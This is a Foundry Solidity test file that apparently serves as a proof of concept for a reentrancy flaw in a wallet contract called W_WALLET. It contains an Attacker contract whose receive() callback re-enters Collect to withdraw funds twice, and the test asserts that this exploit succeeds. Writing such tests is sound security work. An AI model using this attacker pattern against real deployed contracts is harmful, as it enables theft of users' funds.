
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyW_WALLET is Test {
    using stdStorage for StdStorage;
    
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);

        uint256 initialBalance = attackVal * 3;
        
        vm.deal(address(_contractUnderTest), initialBalance);
        vm.deal(address(_attacker), initialBalance);
        vm.deal(address(this), initialBalance);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(block.timestamp + 1000);
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Put{value: msg.value}(block.timestamp + 100);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        victim.Collect(val);
        
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
